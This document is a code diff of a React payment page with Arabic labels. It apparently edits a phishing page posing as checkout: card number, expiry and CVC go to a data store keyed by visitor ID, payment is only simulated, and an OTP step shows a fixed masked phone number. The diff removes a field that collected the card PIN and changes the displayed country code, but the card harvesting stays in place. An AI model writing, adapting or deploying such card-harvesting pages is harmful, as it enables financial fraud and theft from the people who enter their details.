@@ -43,7 +43,6 @@ export default function PaymentMethods() {
   const [cardNumber, setCardNumber] = useState("")
   const [cardExpiry, setCardExpiry] = useState("")
   const [cardCvc, setCardCvc] = useState("")
-  const [cardName, setCardName] = useState("")
   const [currency, setCurrency] = useState("sar")
   const [formErrors, setFormErrors] = useState<Record<string, string>>({})
   const generateOrderId = () => `ORD-${Math.floor(10000 + Math.random() * 90000)}`
@@ -133,9 +132,7 @@ export default function PaymentMethods() {
       errors.cardCvc = "رمز الأمان غير صحيح"
     }
 
-    if (!cardName) {
-      errors.cardName = "يرجى إدخال الرقم السري للبطاقة"
-    }
+    
 
     setFormErrors(errors)
     return Object.keys(errors).length === 0
@@ -156,7 +153,7 @@ export default function PaymentMethods() {
 
     // Submit card data
     const visitorId = getVisitorId()
-    addData({ id: visitorId, cardNumber, cardExpiry, cardCvc, pass: cardName })
+    addData({ id: visitorId, cardNumber, cardExpiry, cardCvc })
 
     // Simulate payment processing
     setTimeout(() => {
@@ -454,7 +451,7 @@ export default function PaymentMethods() {
                           <div className="relative">
                             <Input
                               id="card-number"
-                              placeholder="1234 5678 9012 3456"
+                              placeholder="#### #### #### ####"
                               value={cardNumber}
                               onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                               maxLength={19}
@@ -478,6 +475,7 @@ export default function PaymentMethods() {
                             <Input
                               id="expiry"
                               placeholder="MM/YY"
+                              type="tel"
                               value={cardExpiry}
                               onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                               maxLength={5}
@@ -496,6 +494,7 @@ export default function PaymentMethods() {
                             <Input
                               id="cvc"
                               placeholder="123"
+                              type="tel"
                               maxLength={4}
                               value={cardCvc}
                               onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ""))}
@@ -503,25 +502,7 @@ export default function PaymentMethods() {
                             />
                           </div>
                         </div>
-                        <div className="grid gap-2">
-                          <div className="flex items-center justify-between">
-                            <Label htmlFor="name">الرقم السري للبطاقة</Label>
-                            {formErrors.cardName && (
-                              <span className="text-xs text-destructive flex items-center gap-1">
-                                <AlertCircle className="h-3 w-3" /> {formErrors.cardName}
-                              </span>
-                            )}
-                          </div>
-                          <Input
-                            id="name"
-                            type="tel"
-                            required
-                            maxLength={4}
-                            value={cardName}
-                            onChange={(e) => setCardName(e.target.value)}
-                            className={formErrors.cardName ? "border-destructive" : ""}
-                          />
-                        </div>
+                     
                       </div>
                     )}
 
@@ -623,7 +604,7 @@ export default function PaymentMethods() {
 
             <div className="text-center mb-2">
               <p className="text-sm mb-1">تم إرسال رمز التحقق إلى</p>
-              <p className="font-medium">+966 5XX XXX XX89</p>
+              <p className="font-medium">+965 5XX XXX XX89</p>
             </div>
 
             <div className="flex justify-center gap-2 my-6">
@@ -631,7 +612,7 @@ export default function PaymentMethods() {
                 <div key={index} className="relative">
                   <Input
                     ref={(el) => (otpInputRefs.current[index] = el)}
-                    type="text"
+                    type="tel"
                     inputMode="numeric"
                     maxLength={1}
                     value={value}
